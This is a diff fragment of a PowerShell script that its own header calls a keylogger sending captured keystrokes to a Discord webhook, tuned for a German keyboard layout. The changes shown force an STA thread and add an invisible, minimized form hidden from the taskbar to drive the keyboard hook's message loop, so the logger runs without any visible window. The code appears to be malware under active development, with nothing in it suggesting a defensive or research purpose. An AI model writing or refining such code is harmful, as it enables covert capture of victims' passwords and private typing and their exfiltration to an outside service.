@@ -1,5 +1,8 @@
 # PowerShell Keylogger & Discord-Webhook-Sender mit Timeout (robuster für deutsches Layout)
 
+# Erzwinge STA-Thread für Forms und Hooks
+[System.Threading.Thread]::CurrentThread.ApartmentState = 'STA'
+
 # Prüfe, ob als Administrator läuft
 function Test-Admin {
     $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
@@ -211,8 +214,14 @@ $timeoutTimer.add_Elapsed({
 })
 $timeoutTimer.Start()
 
+# Erstelle eine unsichtbare Form für die Message-Loop
+$form = New-Object System.Windows.Forms.Form
+$form.ShowInTaskbar = $false
+$form.WindowState = 'Minimized'
+$form.Visible = $false
+
 # Message-Loop für Hook
-[System.Windows.Forms.Application]::Run()
+[System.Windows.Forms.Application]::Run($form)
 
 # Nach Timeout stoppen
 $sendTimer.Stop()
